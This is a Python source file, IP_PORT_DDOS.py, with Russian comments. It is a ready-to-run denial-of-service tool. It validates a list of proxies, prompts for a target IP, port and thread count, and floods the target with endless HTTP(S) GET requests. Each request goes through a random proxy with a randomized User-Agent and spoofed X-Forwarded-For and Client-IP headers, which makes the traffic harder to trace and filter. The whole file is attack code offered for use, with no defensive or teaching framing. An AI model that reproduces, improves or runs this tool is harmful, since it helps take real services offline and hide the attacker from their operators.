# IP_PORT_DDOS.py
# DDoS ПО IP И ПОРТУ | ПРОКСИ | ПРОВЕРКА | АНОНИМНО

import requests
import threading
import random
import string
import time
import sys
from colorama import Fore, Style, init
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor

init(autoreset=True)

# ================== ASCII АРТ ==================
def display_ascii_art():
    print(Fore.RED + """
 ____  _  _    ____  _  _    ___  ____  _  _  ____
(  _ \/ )( \  (  _ \/ )( \  / __)/ ___)/ )( \/ ___)
 )__/ ) \/ ( )   /) \/ \/ ( (__)\___ \\ /\ /\  ( 
(__)  (__/  (___/  \____/\___)(____)(__\_)(__/\_|  
    """ + Style.RESET_ALL)

display_ascii_art()

# ================== НАСТРОЙКИ ==================
PROXY_FILE = 'working_proxies.txt'
CHECK_URL = 'https://api.ipify.org'
TIMEOUT = 8
MAX_CHECK_WORKERS = 30
# ===============================================

# Глобальные
target_ip = ""
target_port = 443
use_https = True
num_attackers = 0
ua = UserAgent()
valid_proxies = []
lock = threading.Lock()

# ================== ЛОГИ ==================
def log_success(msg): print(Fore.GREEN + f"[+] {msg}" + Style.RESET_ALL)
def log_error(msg):   print(Fore.RED + f"[-] {msg}" + Style.RESET_ALL)
def log_info(msg):    print(Fore.CYAN + f"[*] {msg}" + Style.RESET_ALL)

# ================== ЗАГРУЗКА ПРОКСИ ==================
def load_proxies():
    try:
        with open(PROXY_FILE, 'r', encoding='utf-8') as f:
            proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        log_info(f"Загружено {len(proxies)} прокси")
        return proxies
    except FileNotFoundError:
        log_error(f"Файл {PROXY_FILE} не найден!")
        sys.exit(1)

# ================== ПРОВЕРКА ПРОКСИ ==================
def check_proxy(proxy):
    proxies_dict = {'http': proxy, 'https': proxy}
    try:
        r = requests.get(CHECK_URL, proxies=proxies_dict, timeout=TIMEOUT, headers={'User-Agent': ua.random}, verify=False)
        return proxy, r.status_code == 200, r.text.strip() if r.status_code == 200 else None
    except:
        return proxy, False, None

def validate_proxies():
    global valid_proxies
    raw = load_proxies()
    log_info(f"Проверка {len(raw)} прокси...")
    working = []
    with ThreadPoolExecutor(max_workers=MAX_CHECK_WORKERS) as executor:
        for proxy, ok, ip in executor.map(check_proxy, raw):
            if ok:
                working.append(proxy)
                log_success(f"{proxy} → {ip}")
            else:
                log_error(f"{proxy} — НЕ РАБОТАЕТ")
    valid_proxies = working
    if not valid_proxies:
        log_error("НИ ОДИН ПРОКСИ НЕ РАБОТАЕТ!")
        sys.exit(1)
    log_info(f"ГОТОВО: {len(valid_proxies)} живых прокси")

# ================== РАНДОМНЫЕ ЗАГОЛОВКИ ==================
def random_client():
    clients = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)",
        "Mozilla/5.0 (Linux; Android 13; SM-S901B)",
        "Googlebot/2.1", "curl/7.68.0"
    ]
    return random.choice(clients) + " " + ''.join(random.choices(string.ascii_letters + string.digits, k=8))

# ================== АТАКА ==================
def attack():
    while True:
        proxy = random.choice(valid_proxies) if valid_proxies else None
        proxies_dict = {'http': proxy, 'https': proxy} if proxy else None
        protocol = "https" if use_https else "http"
        url = f"{protocol}://{target_ip}:{target_port}/"

        headers = {
            'User-Agent': random_client(),
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'Client-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'Host': f"{target_ip}:{target_port}"
        }

        try:
            response = requests.get(
                url,
                headers=headers,
                proxies=proxies_dict,
                timeout=10,
                verify=False
            )
            status = response.status_code
            proxy_name = proxy.split('@')[-1].split(':')[0] if proxy else "ПРЯМОЙ"
            print(Fore.GREEN + f"АТАКА → {proxy_name} | {status} | {target_ip}:{target_port}" + Style.RESET_ALL)
        except:
            proxy_name = proxy.split('@')[-1].split(':')[0] if proxy else "ПРЯМОЙ"
            print(Fore.YELLOW + f"ОШИБКА → {proxy_name} | {target_ip}:{target_port}" + Style.RESET_ALL)

# ================== ОСНОВНОЙ ЗАПУСК ==================
def main():
    global target_ip, target_port, use_https, num_attackers

    print(Fore.CYAN + "Введи IP и порт цели" + Style.RESET_ALL)
    target_ip = input(Fore.CYAN + "IP: " + Style.RESET_ALL).strip()
    port_input = input(Fore.CYAN + "Порт (80/443): " + Style.RESET_ALL).strip()
    
    if not port_input:
        port_input = "443"
    
    target_port = int(port_input)
    use_https = target_port in [443, 8443]

    try:
        num_attackers = int(input(Fore.CYAN + "Потоков: " + Style.RESET_ALL))
    except:
        log_error("Неверное число!")
        sys.exit(1)

    validate_proxies()

    protocol = "HTTPS" if use_https else "HTTP"
    log_info(f"ЗАПУСК: {num_attackers} потоков → {target_ip}:{target_port} ({protocol})")
    log_info("Ctrl+C — остановить\n")
    time.sleep(2)

    threads = []
    for _ in range(num_attackers):
        t = threading.Thread(target=attack, daemon=True)
        t.start()
        threads.append(t)

    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        print(Fore.RED + "\nОСТАНОВКА АТАКИ..." + Style.RESET_ALL)
        sys.exit(0)

# ================== ЗАПУСК ==================
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.RED + "\nАТАКА ОСТАНОВЛЕНА." + Style.RESET_ALL)